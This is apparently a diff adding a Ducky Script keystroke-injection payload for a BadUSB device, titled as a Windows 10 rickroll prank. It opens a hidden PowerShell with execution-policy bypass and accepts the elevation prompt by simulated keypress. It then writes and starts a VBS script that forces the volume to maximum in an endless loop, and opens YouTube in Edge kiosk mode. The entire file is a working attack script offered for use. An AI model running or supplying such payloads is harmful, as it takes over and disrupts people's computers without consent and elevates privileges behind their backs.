@@ -1,0 +1,51 @@
+REM Title: Rickroll with Max Volume spam
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to create a .vbs script to keep volume maximised and opens youtube for rickroll.
+REM Target: Windows 10
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM create the .vbs script to keep the volume maxed.
+STRING cmd
+ENTER
+STRING copy con volup.vbs
+ENTER
+STRING do
+ENTER
+STRING Set WshShell = CreateObject("WScript.Shell")
+ENTER
+STRING WshShell.SendKeys(chr(&hAF))
+ENTER
+STRING WScript.Sleep 10
+ENTER
+STRING loop
+ENTER
+CTRL z
+ENTER
+STRING start volup.vbs
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 1000
+
+REM start Microsoft Edge and open YouTube with Rick Astley - Never Gonna Give You Up.
+GUI r
+DELAY 1000
+STRING msedge.exe --new-window -kiosk https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER
+DELAY 2000
+STRING f
+
+
+
